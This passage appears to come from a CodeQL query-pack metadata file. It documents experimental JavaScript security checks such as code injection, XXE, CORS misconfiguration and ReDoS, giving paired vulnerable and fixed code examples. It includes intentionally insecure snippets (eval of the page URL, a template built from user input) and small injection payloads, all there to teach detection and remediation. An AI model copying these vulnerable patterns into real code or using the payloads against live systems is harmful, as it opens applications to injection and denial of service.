      ```

      ## References
      * Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).
      * MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).
      * OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).
      * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
      * Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).
      * Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-094/CodeInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-094/CodeInjection.bqrs
    metadata:
      name: Code injection with additional heuristic sources
      description: |-
        Interpreting unsanitized user input as code allows a malicious user arbitrary
                      code execution.
      kind: path-problem
      problem.severity: error
      security-severity: 9.3
      precision: high
      id: js/code-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-094
               external/cwe/cwe-095
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Code injection with additional heuristic sources
      Directly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.


      ## Recommendation
      Avoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.


      ## Example
      The following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.


      ```javascript
      eval(document.location.href.substring(document.location.href.indexOf("default=")+8))

      ```
      The following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.


      ```javascript
      const express = require('express')
      var pug = require('pug');
      const app = express()

      app.post('/', (req, res) => {
          var input = req.query.username;
          var template = `
      doctype
      html
      head
          title= 'Hello world'
      body
          form(action='/' method='post')
              input#name.form-control(type='text)
              button.btn.btn-primary(type='submit') Submit
          p Hello `+ input
          var fn = pug.compile(template);
          var html = fn();
          res.send(html);
      })

      ```
      Below is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:


      ```javascript
      const express = require('express')
      var pug = require('pug');
      const app = express()

      app.post('/', (req, res) => {
          var input = req.query.username;
          var template = `
      doctype
      html
      head
          title= 'Hello world'
      body
          form(action='/' method='post')
              input#name.form-control(type='text)
              button.btn.btn-primary(type='submit') Submit
          p Hello #{username}`
          var fn = pug.compile(template);
          var html = fn({username: input});
          res.send(html);
      })

      ```

      ## References
      * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
      * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
      * PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-117/LogInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-117/LogInjection.bqrs
    metadata:
      name: Log injection with additional heuristic sources
      description: |-
        Building log entries from user-controlled sources is vulnerable to
                      insertion of forged log entries by a malicious user.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: medium
      id: js/log-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-117
    queryHelp: |
      # Log injection with additional heuristic sources
      If unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.

      Forgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.


      ## Recommendation
      User input should be suitably sanitized before it is logged.

      If the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.

      For log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.


      ## Example
      In the first example, a username, provided by the user, is logged using \`console.info\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \`console.error\`. If a malicious user provides \`username=Guest%0a\[INFO\]+User:+Admin%0a\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \`\[INFO\]+User:+Admin\`.


      ```javascript
      const http = require('http');
      const url = require('url');

      const server = http.createServer((req, res) => {
          let q = url.parse(req.url, true);

          console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is
      })

      server.listen(3000, '127.0.0.1', () => {});

      ```
      In the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.


      ```javascript
      const http = require('http');
      const url = require('url');

      const server = http.createServer((req, res) => {
          let q = url.parse(req.url, true);

          // GOOD: remove newlines from user controlled input before logging
          let username = q.query.username.replace(/\n|\r/g, "");

          console.info(`[INFO] User: ${username}`);
      });

      server.listen(3000, '127.0.0.1', () => {});

      ```

      ## References
      * OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).
      * Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-134/TaintedFormatString.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-134/TaintedFormatString.bqrs
    metadata:
      name: Use of externally-controlled format string with additional heuristic sources
      description: Using external input in format strings can lead to garbled output.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.3
      precision: high
      id: js/tainted-format-string-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-134
    queryHelp: |
      # Use of externally-controlled format string with additional heuristic sources
      Functions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.


      ## Recommendation
      Either sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.


      ## Example
      The following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:


      ```javascript
      const app = require("express")();

      app.get("unauthorized", function handler(req, res) {
        let user = req.query.user;
        let ip = req.connection.remoteAddress;
        console.log("Unauthorized access attempt by " + user, ip);
      });

      ```
      However, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read "Unauthorized access attempt by NaN", missing all the information that it was trying to log in the first place.

      Instead, the user name should be included using the `%s` specifier:


      ```javascript
      const app = require("express")();

      app.get("unauthorized", function handler(req, res) {
        let user = req.query.user;
        let ip = req.connection.remoteAddress;
        console.log("Unauthorized access attempt by %s", user, ip);
      });

      ```

      ## References
      * Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).
      * Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-346/CorsMisconfigurationForCredentials.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-346/CorsMisconfigurationForCredentials.bqrs
    metadata:
      name:
        CORS misconfiguration for credentials transfer with additional heuristic
        sources
      description:
        Misconfiguration of CORS HTTP headers allows for leaks of secret
        credentials.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/cors-misconfiguration-for-credentials-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-346
               external/cwe/cwe-639
               external/cwe/cwe-942
    queryHelp: |
      # CORS misconfiguration for credentials transfer with additional heuristic sources
      A server can send the `"Access-Control-Allow-Credentials"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.

      When the `Access-Control-Allow-Credentials` header is `"true"`, the `Access-Control-Allow-Origin` header must have a value different from `"*"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `"Access-Control-Allow-Origin"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.


      ## Recommendation
      When the `Access-Control-Allow-Credentials` header value is `"true"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.

      Since the `"null"` origin is easy to obtain for an attacker, it is never safe to use `"null"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `"true"`.


      ## Example
      In the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.


      ```javascript
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function(){});

      server.on('request', function(req, res) {
          let origin = url.parse(req.url, true).query.origin;
           // BAD: attacker can choose the value of origin
          res.setHeader("Access-Control-Allow-Origin", origin);
          res.setHeader("Access-Control-Allow-Credentials", true);

          // ...
      });

      ```
      This is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:


      ```javascript
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function(){});

      server.on('request', function(req, res) {
          let origin = url.parse(req.url, true).query.origin,
              whitelist = {
                  "https://example.com": true,
                  "https://subdomain.example.com": true,
                  "https://example.com:1337": true
              };

          if (origin in whitelist) {
              // GOOD: the origin is in the whitelist
              res.setHeader("Access-Control-Allow-Origin", origin);
              res.setHeader("Access-Control-Allow-Credentials", true);
          }

          // ...
      });

      ```

      ## References
      * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
      * Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).
      * PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
      * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)
      * Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).
      * Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).
      * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-400/RemotePropertyInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-400/RemotePropertyInjection.bqrs
    metadata:
      name: Remote property injection with additional heuristic sources
      description: |-
        Allowing writes to arbitrary properties of an object may lead to
                      denial-of-service attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: medium
      id: js/remote-property-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-250
               external/cwe/cwe-400
    queryHelp:
      "# Remote property injection with additional heuristic sources\nDynamically\
      \ computing object property names from untrusted input may have multiple undesired\
      \ consequences. For example, if the property access is used as part of a write,\
      \ an attacker may overwrite vital properties of objects, such as `__proto__`.\
      \ This attack is known as *prototype pollution attack* and may serve as a vehicle\
      \ for denial-of-service attacks. A similar attack vector, is to replace the `toString`\
      \ property of an object with a primitive. Whenever `toString` is then called on\
      \ that object, either explicitly or implicitly as part of a type coercion, an\
      \ exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled,\
      \ an attacker may exploit this to overwrite security-critical headers such as\
      \ `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\n\
      The most common case in which prototype pollution vulnerabilities arise is when\
      \ JavaScript objects are used for implementing map data structures. This case\
      \ should be avoided whenever possible by using the ECMAScript 2015 `Map` instead.\
      \ When this is not possible, an alternative fix is to prepend untrusted input\
      \ with a marker character such as `$`, before using it in properties accesses.\
      \ In this way, the attacker does not have access to built-in properties which\
      \ do not start with the chosen character.\n\nWhen using user input as part of\
      \ a header name, a sanitization step should be performed on the input to ensure\
      \ that the name does not clash with existing header names such as `Content-Security-Policy`.\n\
      \n\n## Example\nIn the example below, the dynamically computed property `prop`\
      \ is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar\
      \ express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id',\
      \ function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop]\
      \ = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis\
      \ is not secure since an attacker may exploit this code to overwrite the property\
      \ `__proto__` with an empty function. If this happens, the concatenation in the\
      \ `console.log` argument will fail with a confusing message such as \"Function.prototype.toString\
      \ is not generic\". If the application does not properly handle this error, this\
      \ scenario may result in a serious denial-of-service attack. The fix is to prepend\
      \ the user-controlled string with a marker character such as `$` which will prevent\
      \ arbitrary property names from being overwritten.\n\n\n```javascript\nvar express\
      \ = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id',\
      \ function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\
      \tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n\
      });\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287),\
      \ [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n\
      * Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n\
      * npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n\
      * Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n\
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-502/UnsafeDeserialization.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-502/UnsafeDeserialization.bqrs
    metadata:
      name: Deserialization of user-controlled data with additional heuristic sources
      description: |-
        Deserializing user-controlled data may allow attackers to
                      execute arbitrary code.
      kind: path-problem
      problem.severity: warning
      security-severity: 9.8
      precision: high
      id: js/unsafe-deserialization-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-502
    queryHelp: |
      # Deserialization of user-controlled data with additional heuristic sources
      Deserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.


      ## Recommendation
      Avoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.


      ## Example
      The following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.


      ```javascript
      const app = require("express")(),
        jsyaml = require("js-yaml");

      app.get("load", function(req, res) {
        let data = jsyaml.load(req.params.data);
        // ...
      });

      ```
      Using the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.


      ```javascript
      const app = require("express")(),
        jsyaml = require("js-yaml");

      app.get("load", function(req, res) {
        let data = jsyaml.safeLoad(req.params.data);
        // ...
      });

      ```

      ## References
      * OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).
      * OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
      * Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).
      * Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-611/Xxe.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-611/Xxe.bqrs
    metadata:
      name: XML external entity expansion with additional heuristic sources
      description: |-
        Parsing user input as an XML document with external
                      entity expansion is vulnerable to XXE attacks.
      kind: path-problem
      problem.severity: error
      security-severity: 9.1
      precision: high
      id: js/xxe-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-611
               external/cwe/cwe-827
    queryHelp: |
      # XML external entity expansion with additional heuristic sources
      Parsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.


      ## Recommendation
      The easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.


      ## Example
      The following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:


      ```javascript
      const app = require("express")(),
        libxml = require("libxmljs");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          doc = libxml.parseXml(xmlSrc, { noent: true });
      });

      ```
      To guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).


      ```javascript
      const app = require("express")(),
        libxml = require("libxmljs");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          doc = libxml.parseXml(xmlSrc);
      });

      ```

      ## References
      * OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).
      * Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).
      * Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).
      * Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).
      * Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-643/XpathInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-643/XpathInjection.bqrs
    metadata:
      name: XPath injection with additional heuristic sources
      description: |-
        Building an XPath expression from user-controlled sources is vulnerable to insertion of
                      malicious code by the user.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/xpath-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-643
    queryHelp: |
      # XPath injection with additional heuristic sources
      If an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.


      ## Recommendation
      If user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.


      ## Example
      In this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.


      ```javascript
      const express = require('express');
      const xpath = require('xpath');
      const app = express();

      app.get('/some/route', function(req, res) {
        let userName = req.param("userName");

        // BAD: Use user-provided data directly in an XPath expression
        let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
        badXPathExpr.select({
          node: root
        });
      });

      ```
      Instead, embed the user input using the variable replacement mechanism offered by `xpath`:


      ```javascript
      const express = require('express');
      const xpath = require('xpath');
      const app = express();

      app.get('/some/route', function(req, res) {
        let userName = req.param("userName");

        // GOOD: Embed user-provided data using variables
        let goodXPathExpr = xpath.parse("//users/user[login/text()=$userName]/home_dir/text()");
        goodXPathExpr.select({
          node: root,
          variables: { userName: userName }
        });
      });

      ```

      ## References
      * OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).
      * OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).
      * npm: [xpath](https://www.npmjs.com/package/xpath).
      * Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-730/RegExpInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-730/RegExpInjection.bqrs
    metadata:
      name: Regular expression injection with additional heuristic sources
      description: |-
        User input should not be used in regular expressions without first being escaped,
                      otherwise a malicious user may be able to inject an expression that could require
                      exponential time on certain inputs.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/regex-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-730
               external/cwe/cwe-400
    queryHelp: |
      # Regular expression injection with additional heuristic sources
      Constructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.


      ## Recommendation
      Before embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.


      ## Example
      The following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:


      ```javascript
      var express = require('express');
      var app = express();

      app.get('/findKey', function(req, res) {
        var key = req.param("key"), input = req.param("input");

        // BAD: Unsanitized user input is used to construct a regular expression
        var re = new RegExp("\\b" + key + "=(.*)\n");
      });

      ```
      Instead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.


      ```javascript
      var express = require('express');
      var _ = require('lodash');
      var app = express();

      app.get('/findKey', function(req, res) {
        var key = req.param("key"), input = req.param("input");

        // GOOD: User input is sanitized before constructing the regex
        var safeKey = _.escapeRegExp(key);
        var re = new RegExp("\\b" + safeKey + "=(.*)\n");
      });

      ```

      ## References
      * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
      * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
      * npm: [lodash](https://www.npmjs.com/package/lodash).
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-770/ResourceExhaustion.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-770/ResourceExhaustion.bqrs
    metadata:
      name: Resource exhaustion with additional heuristic sources
      description: |-
        Allocating objects or timers with user-controlled
                      sizes or durations can cause resource exhaustion.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      id: js/resource-exhaustion-more-sources
      precision: high
      tags: |-
        experimental
               security
               external/cwe/cwe-400
               external/cwe/cwe-770
    queryHelp:
      "# Resource exhaustion with additional heuristic sources\nApplications\
      \ are constrained by how many resources they can make use of. Failing to respect\
      \ these constraints may cause the application to be unresponsive or crash. It\
      \ is therefore problematic if attackers can control the sizes or lifetimes of\
      \ allocated objects.\n\n\n## Recommendation\nEnsure that attackers can not control\
      \ object sizes and their lifetimes. If object sizes and lifetimes must be controlled\
      \ by external parties, ensure you restrict the object sizes and lifetimes so that\
      \ they are within acceptable ranges.\n\n\n## Example\nThe following example allocates\
      \ a buffer with a user-controlled size.\n\n\n```javascript\nvar http = require(\"\
      http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet\
      \ buffer = Buffer.alloc(size); // BAD\n\n\t// ... use the buffer\n});\n```\nThis\
      \ is problematic since an attacker can choose a size that makes the application\
      \ run out of memory. Even worse, in older versions of Node.js, this could leak\
      \ confidential memory. To prevent such attacks, limit the buffer size:\n\n\n```javascript\n\
      var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif\
      \ (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\
      \t\treturn;\n\t}\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use\
      \ the buffer\n});\n```\n\n## Example\nAs another example, consider an application\
      \ that allocates an array with a user-controlled size, and then fills it with\
      \ values:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"\
      url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url,\
      \ true).query.size);\n\n\tlet dogs = new Array(size).fill(\"dog\"); // BAD\n\n\
      \t// ... use the dog\n});\n```\nThe allocation of the array itself is not problematic\
      \ since arrays are allocated sparsely, but the subsequent filling of the array\
      \ will take a long time, causing the application to be unresponsive, or even run\
      \ out of memory. Again, a limit on the size will prevent the attack:\n\n\n```javascript\n\
      var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif\
      \ (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\
      \t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t\
      // ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets\
      \ a user choose a delay after which a function is executed:\n\n\n```javascript\n\
      var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\t\
      setTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large\
      \ delay essentially makes the application wait indefinitely before executing the\
      \ function. Repeated registrations of such delays will therefore use up all of\
      \ the memory in the application. A limit on the delay will prevent the attack:\n\
      \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
      \nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url,\
      \ true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\t\
      res.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\
      \n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n\
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\
      * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-776/XmlBomb.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-776/XmlBomb.bqrs
    metadata:
      name: XML internal entity expansion with additional heuristic sources
      description: |-
        Parsing user input as an XML document with arbitrary internal
                      entity expansion is vulnerable to denial-of-service attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/xml-bomb-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-776
               external/cwe/cwe-400
    queryHelp: |
      # XML internal entity expansion with additional heuristic sources
      Parsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.

      In XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.

      If untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.


      ## Recommendation
      The safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.


      ## Example
      The following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:


      ```javascript
      const app = require("express")(),
        expat = require("node-expat");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          parser = new expat.Parser();
        parser.on("startElement", handleStart);
        parser.on("text", handleText);
        parser.write(xmlSrc);
      });

      ```
      At the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:


      ```javascript
      const app = require("express")(),
        sax = require("sax");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          parser = sax.parser(true);
        parser.onopentag = handleStart;
        parser.ontext = handleText;
        parser.write(xmlSrc);
      });

      ```

      ## References
